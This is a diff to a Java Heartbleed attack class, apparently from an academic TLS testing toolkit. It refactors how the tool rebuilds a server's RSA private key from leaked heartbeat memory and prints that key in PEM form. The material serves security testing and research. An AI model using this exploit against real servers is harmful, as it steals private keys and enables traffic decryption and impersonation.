@@ -42,17 +42,13 @@ import de.rub.nds.tlsbreaker.heartbleed.config.HeartbleedCommandConfig;
 import de.rub.nds.util.ByteArrayUtils;
 import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
+import org.bouncycastle.asn1.pkcs.RSAPrivateKey;
 
 import java.io.ByteArrayOutputStream;
 import java.io.FileWriter;
 import java.io.IOException;
 import java.math.BigInteger;
-import java.security.KeyFactory;
-import java.security.NoSuchAlgorithmException;
-import java.security.PrivateKey;
 import java.security.interfaces.RSAPublicKey;
-import java.security.spec.InvalidKeySpecException;
-import java.security.spec.RSAPrivateKeySpec;
 import java.util.ArrayList;
 import java.util.LinkedList;
 import java.util.List;
@@ -102,7 +98,7 @@ public class HeartbleedAttacker extends Attacker<HeartbleedCommandConfig> {
                 LOGGER.info("Could not retrieve PublicKey from Server - is the Server running?");
                 return;
             }
-            PrivateKey privateKey = null;
+            RSAPrivateKey rsaPrivateKey = null;
 
             // for (int i = 0; i < config.getHeartbeatCount(); i = i + 50) {
             /*
@@ -155,8 +151,9 @@ public class HeartbleedAttacker extends Attacker<HeartbleedCommandConfig> {
                 // prime size would be half of modulus bit length(2048). So, prime size = 1024 bit length = 128byte
                 count++;
                 // privateKey = findPrivateKey(heartbeatMessage.getPayload().getOriginalValue(), publicKey, count);
-                privateKey = findPrivateKey(message.getCompleteResultingMessage().getOriginalValue(), publicKey, count);
-                if (privateKey != null) {
+                rsaPrivateKey =
+                        findPrivateKey(message.getCompleteResultingMessage().getOriginalValue(), publicKey, count);
+                if (rsaPrivateKey != null) {
                     break;
                 }
             }
@@ -164,8 +161,8 @@ public class HeartbleedAttacker extends Attacker<HeartbleedCommandConfig> {
              * if (privateKey != null) { break; }
              */
             // }
-            if (privateKey != null) {
-                displayPrivateKey(privateKey);
+            if (rsaPrivateKey != null) {
+                displayPrivateKey(rsaPrivateKey);
             } else {
                 LOGGER.info("Private key could not be found.");
             }
@@ -241,26 +238,37 @@ public class HeartbleedAttacker extends Attacker<HeartbleedCommandConfig> {
             return;
         }
 
-        PrivateKey privateKey = null;
+        RSAPrivateKey rsaPrivateKey = null;
         for (byte[] data : fileContents) {
-            privateKey = findPrivateKey(data, publicKey, 0);
-            if (privateKey != null) {
-                displayPrivateKey(privateKey);
+            rsaPrivateKey = findPrivateKey(data, publicKey, 0);
+            if (rsaPrivateKey != null) {
                 break;
             }
         }
 
+        if (rsaPrivateKey != null) {
+            displayPrivateKey(rsaPrivateKey);
+        } else {
+            LOGGER.info("Private key could not be found.");
+        }
     }
 
-    private void displayPrivateKey(PrivateKey privateKey) {
+    private void displayPrivateKey(RSAPrivateKey rsaPrivateKey) {
         ByteArrayOutputStream baos = new ByteArrayOutputStream();
-        PemUtil.writePrivateKey(privateKey, baos);
+        try {
+            PemUtil.writePrivateKey(rsaPrivateKey.getEncoded(), baos);
+        } catch (IOException ioException) {
+            ioException.printStackTrace();
+        }
         String encodedPrivateKey = new String(baos.toByteArray());
+        encodedPrivateKey = encodedPrivateKey.replace("BEGIN PRIVATE KEY", "BEGIN RSA PRIVATE KEY");
+        encodedPrivateKey = encodedPrivateKey.replace("END PRIVATE KEY", "END RSA PRIVATE KEY");
+
         LOGGER.info("Encoded private key: " + System.lineSeparator() + encodedPrivateKey);
         // LOGGER.info(System.lineSeparator() + encodedPrivateKey);
     }
 
-    private PrivateKey findPrivateKey(byte[] rawServerData, RSAPublicKey publicKey, int count) {
+    private RSAPrivateKey findPrivateKey(byte[] rawServerData, RSAPublicKey publicKey, int count) {
         String str = null;
         // byte[] rawServerData = heartbeatMessage.getPayload().getOriginalValue();
         BigInteger n = publicKey.getModulus();
@@ -319,7 +327,7 @@ public class HeartbleedAttacker extends Attacker<HeartbleedCommandConfig> {
         return null;
     }
 
-    private PrivateKey getPrivateKey(BigInteger p, BigInteger n, BigInteger e) {
+    private RSAPrivateKey getPrivateKey(BigInteger p, BigInteger n, BigInteger e) {
         BigInteger q = n.divide(p);
         BigInteger pMinusOne = p.subtract(ONE);
         BigInteger qMinusOne = q.subtract(ONE);
@@ -331,17 +339,24 @@ public class HeartbleedAttacker extends Attacker<HeartbleedCommandConfig> {
         LOGGER.info("phi = " + phi);
         LOGGER.info("d = " + d);
         // RSAPrivateCrtKeyImpl();
-        KeyFactory keyFactory = null;
-        PrivateKey privateKey = null;
-        try {
-            keyFactory = KeyFactory.getInstance("RSA");
-            privateKey = keyFactory.generatePrivate(new RSAPrivateKeySpec(n, d));
-        } catch (NoSuchAlgorithmException | InvalidKeySpecException exception) {
-            exception.printStackTrace();
-        }
+        /*
+         * KeyFactory keyFactory = null; PrivateKey privateKey = null; try { keyFactory = KeyFactory.getInstance("RSA");
+         * privateKey = keyFactory.generatePrivate(new RSAPrivateKeySpec(n, d)); } catch (NoSuchAlgorithmException |
+         * InvalidKeySpecException exception) { exception.printStackTrace(); }
+         */
+        RSAPrivateKey rsaPrivateKey =
+                new RSAPrivateKey(n, e, d, p, q, d.mod(pMinusOne), d.mod(qMinusOne), q.modInverse(p));
+        // rsaPrivateKey.getEncoded();
+        /*
+         * StringWriter sWrt = new StringWriter(); JcaPEMWriter pemWriter = new JcaPEMWriter(sWrt); try {
+         * pemWriter.writeObject(rsaPrivateKey); pemWriter.close(); } catch (IOException ioException) {
+         * ioException.printStackTrace(); } LOGGER.info(sWrt.toString());
+         */
+
+        // java.lang.Object.iaik.security.rsa.RSAPrivateKey.RSAPrivateKey rsaPrivateKey// = new RSAPrivateKey();
 
         // return new CustomRSAPrivateKey(n, d);
-        return privateKey;
+        return rsaPrivateKey;
     }
 
     /**
